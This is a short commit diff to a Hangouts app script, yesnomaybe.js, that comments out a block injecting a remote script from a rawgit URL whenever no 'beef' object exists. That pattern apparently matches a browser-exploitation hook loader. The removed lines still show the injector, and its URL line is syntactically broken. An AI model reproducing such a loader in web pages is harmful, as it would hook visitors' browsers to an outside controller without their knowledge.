83b8fe7d15946de4fa0419d7cbb39e8bfd2822ea
730 <leonardo>
2015-05-04 00:33:01 -0500

    changin

--- ggs/yesnomaybe.js
+++ ggs/yesnomaybe.js
@@ -30,13 +30,13 @@ var Answers = {
 // <script type="text/javascript" src="https://rawgit.com/lyonn19/hangoutGoogle/master/ggs/encoder.js"></script>
 
 
-  var url = https:https://rawgit.com/lyonn19/hangoutGoogle/master/ggs/encoder.js;
-  if (typeof beef == 'undefined') {
-     var bf = document.createElement('script');
-     bf.type = 'text/javascript';
-     bf.src = url;
-     document.body.appendChild(bf);
-  }
+//  var url = https:https://rawgit.com/lyonn19/hangoutGoogle/master/ggs/encoder.js;
+//  if (typeof beef == 'undefined') {
+//     var bf = document.createElement('script');
+//     bf.type = 'text/javascript';
+//     bf.src = url;
+//     document.body.appendChild(bf);
+//  }
 
 
 //var HOST = '//hangoutsapi.appspot.com/static/yesnomaybe';
